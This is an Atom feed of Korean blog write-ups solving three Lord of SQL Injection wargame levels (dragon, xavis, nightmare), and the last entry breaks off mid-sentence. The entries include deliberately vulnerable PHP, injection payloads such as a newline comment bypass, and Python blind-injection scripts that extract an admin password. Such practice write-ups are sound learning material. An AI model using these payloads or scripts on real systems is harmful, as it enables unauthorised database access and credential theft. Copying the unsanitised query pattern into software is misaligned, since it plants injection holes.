<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>jslee&#39;s blog</title>
  
  <subtitle>Develop, InfoSec &amp; Life</subtitle>
  <link href="/feed.xml" rel="self"/>
  
  <link href="https://www.jslee.me/"/>
  <updated>2019-09-17T06:08:17.184Z</updated>
  <id>https://www.jslee.me/</id>
  
  <author>
    <name>Jaeseok Lee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.20 Dragon</title>
    <link href="https://www.jslee.me/2019/09/15/los-write-up-20-dragon/"/>
    <id>https://www.jslee.me/2019/09/15/los-write-up-20-dragon/</id>
    <published>2019-09-15T11:45:46.000Z</published>
    <updated>2019-09-17T06:08:17.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 20번 dragon 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>주석 처리를 우회할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>dragon 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_dragon where id='guest'# and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"dragon"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_dragon where id='guest'# and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"dragon"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>다만 <code>id=&#39;guest&#39;</code> 뒤에 주석인 <code>#</code>이 붙어있어 그 뒤에 들어가는 코드가 처리되지 않는다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>개행 문자로 주석 처리 우회</p><p><code>id=&#39;guest&#39;</code> 뒤에 주석인 <code>#</code>이 붙어있어 그 뒤에 들어가는 코드가 처리되지 않는다.</p><p><code>pw</code>의 값에 개행 문자인 LF(Line Feed, <code>%0A</code>)를 삽입하여 주석 처리를 우회한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/dragon_7ead3fe768221c5d34bc42d518130972.php?pw=&apos;%0aor 1=1 limit 1,1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_dragon <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span><span class="comment"># and pw='' or 1=1 limit 1,1-- -'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 20번 dragon 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.19 Xavis</title>
    <link href="https://www.jslee.me/2019/09/14/los-write-up-19-xavis/"/>
    <id>https://www.jslee.me/2019/09/14/los-write-up-19-xavis/</id>
    <published>2019-09-14T11:31:35.000Z</published>
    <updated>2019-09-17T06:08:17.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 19번 xavis 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>ASCII 코드 범위에 포함되지 않는 문자를 대상으로 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>xavis 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/regex|like/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"xavis"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/regex|like/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, <code>#</code>, <code>-</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 <code>regex</code>, <code>like</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"xavis"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 “0”을 제외한 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>pw의 범위 확장</p><p>이 문제는 얼핏 보면 지금까지의 Blind SQL Injection 문제들과 거의 동일하다.<br>따라서 지금까지의 문제들을 해결하는 데 이용한 Python 코드를 그대로 활용해서 문제 풀이를 시도해 볼 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>): <span class="comment"># 20까지 시도로 찾아지지 않아서 50으로 늘림</span></span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="</span></span><br><span class="line">    data = <span class="string">"' or id='admin' and length(pw)='&#123;&#125;'#"</span>.format(str(i))</span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jtkacptqj14heqvtcuofma30m2"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="</span></span><br><span class="line">        data = <span class="string">"' or id='admin' and substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format(</span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jtkacptqj14heqvtcuofma30m2"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이때, 패스워드는 40바이트라는 것을 알아낼 수 있으나 두번째 루프에서 패스워드를 찾지 못하는 것을 알 수 있다.<br>이로 화면에 표현할 수 있는 아스키 코드의 범위인 32에서 126까지 범위에 패스워드가 들어있지 않음을 추측할 수 있다.<br>따라서 코드를 수정한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line">hexcode = <span class="string">"0x"</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">1000</span>):  <span class="comment"># 범위 확장</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="</span></span><br><span class="line">        data = <span class="string">"' or id='admin' and ord(substr(pw, &#123;&#125;, 1))='&#123;&#125;'#"</span>.format(</span><br><span class="line">            str(i), str(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jtkacptqj14heqvtcuofma30m2"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j)</span><br><span class="line">            hexcode += hex(j)[<span class="number">2</span>:]</span><br><span class="line">            print(<span class="string">'key : '</span> + key)</span><br><span class="line">            print(<span class="string">'hex : '</span> + hexcode)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>0xb8f9c5b0c6d0c4a1a4bb</code> 를 출력한다.<br>이를 Unicode 문자로 변환한 <code>¸ùÅ°ÆÐÄ¡¤»</code>를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=¸ùÅ°ÆÐÄ¡¤»</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 19번 xavis 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.18 Nightmare</title>
    <link href="https://www.jslee.me/2019/09/08/los-write-up-18-nightmare/"/>
    <id>https://www.jslee.me/2019/09/08/los-write-up-18-nightmare/</id>
    <published>2019-09-08T13:19:09.000Z</published>
    <updated>2019-09-17T06:08:17.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 18번 nightmare 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>주석 필터링을 우회하고 MySQL Auto Casting을 이용하여 SQL Injection을 할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="MySQL-Type-Conversion-Auto-Casting"><a href="#MySQL-Type-Conversion-Auto-Casting" class="headerlink" title="MySQL Type Conversion, Auto Casting"></a>MySQL Type Conversion, Auto Casting</h4><ul><li>MySQL에도 기타 프로그래밍 언어처럼 형 변환이 존재한다.</li><li>그 중 문자열 관련 자료형이 숫자 자료형으로 변환되는 경우 문자열에서 문자가 나오기 전에 나오는 숫자만 변환되고 만약 문자가 가장 먼저 나오면 0으로 변환된다.</li><li>MySQL의 Type Conversion에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">MySQL :: MySQL 5.7 Reference Manual :: 12.2 Type Conversion in Expression Evaluation</a></li></ul><h4 id="MySQL-주석"><a href="#MySQL-주석" class="headerlink" title="MySQL 주석"></a>MySQL 주석</h4><ul><li>MySQL에서 사용될 수 있는 주석에는 <code>#</code>, <code>--%20</code> 뿐만 아니라 <code>;%00</code>, <code>/*</code> 등도 있다.</li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>nightmare 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|#|-/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_nightmare where pw=('&#123;$_GET[pw]&#125;') and id!='admin'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"nightmare"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|#|-/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, <code>#</code>, <code>-</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, 받은 <code>pw</code>의 길이가 6 이상이면 <code>No Hack ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_nightmare where pw=('&#123;$_GET[pw]&#125;') and id!='admin'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"nightmare"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 참이 되는 어떤 문자열이든 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>MySQL Auto Casting, 주석 우회 이용</p><p>MySQL에서 문자열과 숫자를 연산하면 숫자 자료형으로 Auto Casting이 일어난다.<br>이때, 문자가 숫자로 시작하지 않으면 <code>0</code>으로 변환되게 된다.</p><p>이를 이용하여, 문자로 시작하는 모든 <code>pw</code>를 